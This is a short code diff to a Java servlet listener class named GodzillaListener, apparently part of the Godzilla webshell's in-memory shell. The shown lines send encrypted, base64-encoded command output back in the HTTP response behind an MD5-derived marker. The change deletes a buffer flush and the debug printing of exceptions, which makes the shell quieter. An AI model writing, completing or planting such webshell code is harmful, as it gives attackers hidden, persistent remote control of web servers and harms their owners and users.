@@ -209,13 +209,9 @@ public class GodzillaListener extends ClassLoader implements ServletRequestListe
                     f.toString();
                     response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                     response.getWriter().write(md5.substring(16));
-                    response.flushBuffer();
                 }
             }
         } catch (Exception e) {
-            System.out.println("---------------------");
-            System.out.println(e);
-            System.out.println("---------------------");
         }
     }
 }
